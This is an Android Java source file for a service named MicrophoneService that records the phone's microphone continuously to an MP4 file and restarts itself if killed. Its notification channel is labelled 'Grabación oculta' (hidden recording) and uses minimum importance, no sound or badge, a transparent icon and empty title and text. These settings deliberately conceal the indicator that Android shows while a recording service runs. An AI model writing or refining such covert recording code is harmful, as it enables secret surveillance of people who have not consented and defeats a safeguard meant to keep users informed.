package com.example.appGrabacion;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.example.appGrabacion.R;

import java.io.File;
import java.io.IOException;

public class MicrophoneService extends Service {

    private static final String TAG = "MicrophoneService";
    public static final String CHANNEL_ID = "MicrophoneChannel";

    private MediaRecorder mediaRecorder;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        startForegroundNotification();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");
        if (mediaRecorder == null) {
            setupMediaRecorder();
            startRecording();
        }
        return START_STICKY; // Mantén el servicio vivo incluso si el sistema lo mata
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
        stopRecording();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    private void startForegroundNotification() {
        // 1) Canal en IMPORTANCE_MIN (Android O+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Grabación oculta",
                    NotificationManager.IMPORTANCE_MIN
            );
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.setShowBadge(false);
            ((NotificationManager)getSystemService(NOTIFICATION_SERVICE))
                    .createNotificationChannel(channel);
        }

        // 2) Notificación silenciosa con NotificationCompat
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_trasparente)
                .setContentTitle("")
                .setContentText("")
                .setOngoing(true)                            // persistente
                .setSilent(true)                             // silencia por completo
                .setOnlyAlertOnce(true)                      // no suena al actualizar
                .setShowWhen(false)                          // no muestra hora
                .setPriority(NotificationCompat.PRIORITY_MIN) // prioridad mínima
                .build();

        // 3) Arranca el servicio en foreground
        startForeground(1, notification);
    }


    private void setupMediaRecorder() {
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC); // Asegúrate de usar el micrófono
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);

        File outputFile = new File(getExternalFilesDir(null), "audio_record.mp4");
        mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);

        try {
            mediaRecorder.prepare();
            Log.d(TAG, "MediaRecorder prepared");
        } catch (IOException e) {
            Log.e(TAG, "Error preparing MediaRecorder", e);
        }
    }

    private void startRecording() {
        try {
            if (mediaRecorder != null) {
                mediaRecorder.start();
                Log.d(TAG, "Recording started");
            }
        } catch (IllegalStateException e) {
            Log.e(TAG, "Error starting MediaRecorder", e);
        }
    }

    private void stopRecording() {
        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
                mediaRecorder.reset();
                mediaRecorder.release();
                mediaRecorder = null;
                Log.d(TAG, "Recording stopped");
            }
        } catch (IllegalStateException e) {
            Log.e(TAG, "Error stopping MediaRecorder", e);
        }
    }
}
